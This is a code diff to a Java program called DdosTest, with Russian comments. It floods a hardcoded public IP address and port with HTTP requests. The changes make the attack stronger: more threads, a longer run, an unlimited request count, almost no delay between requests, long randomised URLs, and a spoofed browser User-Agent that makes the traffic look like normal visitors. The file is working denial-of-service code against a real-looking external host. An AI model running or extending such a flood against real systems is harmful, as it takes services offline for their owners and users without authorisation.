@@ -14,9 +14,9 @@ import java.util.concurrent.atomic.AtomicInteger;
 
 public class DdosTest {
     private static final String TARGET_URL = "http://34.132.194.33:9400";
-    private static final int NUM_THREADS = 5;
-    private static final int DURATION_SECONDS = 60;
-    private static final int REQUESTS_PER_THREAD = 1000000;
+    private static final int NUM_THREADS = 20; // Максимальное количество потоков HTTP-сервера
+    private static final int DURATION_SECONDS = 300; // 5 минут
+    private static final int REQUESTS_PER_THREAD = Integer.MAX_VALUE; // Максимальное количество запросов
     private static final Random random = new Random();
     private static final AtomicInteger totalErrors = new AtomicInteger(0);
     private static final AtomicInteger timeoutErrors = new AtomicInteger(0);
@@ -99,7 +99,7 @@ public class DdosTest {
 
         public RequestWorker() {
             this.client = HttpClient.newBuilder()
-                .connectTimeout(Duration.ofSeconds(10))
+                .connectTimeout(Duration.ofSeconds(5)) // Уменьшаем таймаут для быстрого обнаружения проблем
                 .build();
         }
 
@@ -110,14 +110,18 @@ public class DdosTest {
             while (System.currentTimeMillis() < endTime && 
                    totalRequests.get() < REQUESTS_PER_THREAD) {
                 try {
-                    String url = TARGET_URL + "?param1=" + random.nextInt(1000) + 
-                                "&param2=" + random.nextInt(1000) +
-                                "&param3=" + random.nextInt(1000) +
-                                "&param4=" + random.nextInt(1000);
+                    // Генерируем большой URL с множеством параметров
+                    StringBuilder urlBuilder = new StringBuilder(TARGET_URL);
+                    for (int i = 0; i < 20; i++) { // Добавляем 20 параметров
+                        urlBuilder.append("&param").append(i).append("=")
+                                .append(random.nextInt(1000000));
+                    }
                     
                     HttpRequest request = HttpRequest.newBuilder()
-                        .uri(URI.create(url))
-                        .timeout(Duration.ofSeconds(10))
+                        .uri(URI.create(urlBuilder.toString()))
+                        .timeout(Duration.ofSeconds(5))
+                        .header("Connection", "keep-alive") // Используем keep-alive
+                        .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                         .GET()
                         .build();
 
@@ -130,7 +134,8 @@ public class DdosTest {
                         successfulRequests.incrementAndGet();
                     }
 
-                    Thread.sleep(10);
+                    // Минимальная задержка
+                    Thread.sleep(1);
                 } catch (IOException e) {
                     totalErrors.incrementAndGet();
                     if (e.getMessage().contains("timed out")) {
